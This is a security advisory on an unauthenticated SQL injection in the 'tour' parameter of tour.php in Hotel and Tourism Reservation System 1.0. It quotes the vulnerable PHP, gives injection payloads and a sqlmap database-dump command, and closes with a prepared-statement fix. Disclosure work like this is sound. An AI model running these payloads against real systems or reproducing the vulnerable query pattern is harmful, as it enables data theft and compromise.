# Hotel and Tourism Reservation System - Unauthenticated SQL Injection in tour.php

## Vulnerability Details

| Field | Details |
|-------|---------|
| **Title** | Hotel and Tourism Reservation System - SQL Injection via `tour` GET Parameter |
| **CVE ID** | Pending Assignment |
| **Vendor** | code-projects.org |
| **Vendor URL** | https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/ |
| **Product** | Hotel and Tourism Reservation System |
| **Version** | 1.0 |
| **Vulnerability Type** | SQL Injection |
| **CWE** | CWE-89 |
| **CVSS Score** | 9.8 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Affected File** | `/ht/tour.php` |
| **Affected Parameter** | `tour` (GET) |
| **Authentication Required** | No |
| **Remote Exploitable** | Yes |
| **Researcher** | Syed Imad Uddin Alvi |

---

## Description

A critical SQL Injection vulnerability exists in the `tour` GET parameter of `tour.php` in Hotel and Tourism Reservation System 1.0. The parameter is passed directly into a raw SQL query with no sanitization, no prepared statements, and no input validation. An unauthenticated remote attacker can manipulate the query to extract, modify, or delete any data in the database. The vulnerability was confirmed by a full database dump using sqlmap.

**Vulnerable code in `tour.php`:**

```php
if(isset($_GET['tour'])) {
    $tourID = $_GET['tour'];
    $select = $db->query("SELECT * FROM tourism WHERE id = '{$tourID}' ");
    $s = $db->query("SELECT * FROM tourism WHERE id = '{$tourID}' ");
    $data = mysqli_fetch_assoc($s);
```

`$tourID` is taken directly from `$_GET['tour']` and interpolated into the SQL query with no sanitization whatsoever.

---

## Steps to Reproduce

**Setup:** Install Hotel and Tourism Reservation System 1.0 on XAMPP and access at `http://<target>/ht/`

**Step 1 — Visit any tour page as an unauthenticated user:**

```
http://<target>/ht/tour.php?tour=4
```

<img width="1920" height="1080" alt="Screenshot 2026-05-12 001635" src="https://github.com/user-attachments/assets/59a6ef8b-ccdf-42e3-9b7b-ae68920f529c" />


**Step 2 — Inject a single quote to break the SQL query and confirm the vulnerability:**

```
http://<target>/ht/tour.php?tour='
```

**Result:** Fatal MySQL error is thrown — confirming unsanitized input reaches the SQL query.


<img width="1920" height="1080" alt="Screenshot 2026-05-12 001643" src="https://github.com/user-attachments/assets/1820381d-f0c4-40fe-b72c-1d20fe5d50ce" />


**Step 3 — Confirm SQLi with a boolean-based payload:**

```
http://<target>/ht/tour.php?tour=' or 1=1 -- -
```

**Result:** Page loads normally with tour data — boolean injection successful.


<img width="1920" height="1080" alt="Screenshot 2026-05-12 001654" src="https://github.com/user-attachments/assets/d6925ddf-5152-422c-8781-d9571441d488" />


**Step 4 — Dump the entire database using sqlmap:**

```bash
sqlmap -r sqli.txt --dump --batch
```

**Result:** sqlmap successfully dumps all tables in `hotel_db` including `users`, `rooms`, `tour_reserves`, `gallery` — full database compromise confirmed.


<img width="1920" height="1080" alt="Screenshot 2026-05-12 001722" src="https://github.com/user-attachments/assets/752eab45-53a0-4d96-9617-d8f755882a7b" />


---

## Impact

An unauthenticated remote attacker can:
- Extract all data from the database including user credentials, emails, phone numbers, and reservation details
- Bypass authentication by extracting admin credentials
- Modify or delete any database records
- Potentially achieve Remote Code Execution via `INTO OUTFILE` if file privileges are granted

---

## Root Cause

The `tour` GET parameter is interpolated directly into a raw SQL query with no use of prepared statements, parameterized queries, or input sanitization:

```php
// VULNERABLE
$tourID = $_GET['tour'];
$select = $db->query("SELECT * FROM tourism WHERE id = '{$tourID}' ");

// FIXED — use prepared statements
$stmt = $db->prepare("SELECT * FROM tourism WHERE id = ?");
$stmt->bind_param("i", $_GET['tour']);
$stmt->execute();
```

---

## References

- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Hotel and Tourism Reservation System — code-projects.org](https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/)

---

## Discovered By

**Syed Imad Uddin Alvi** — Independent Security Researcher
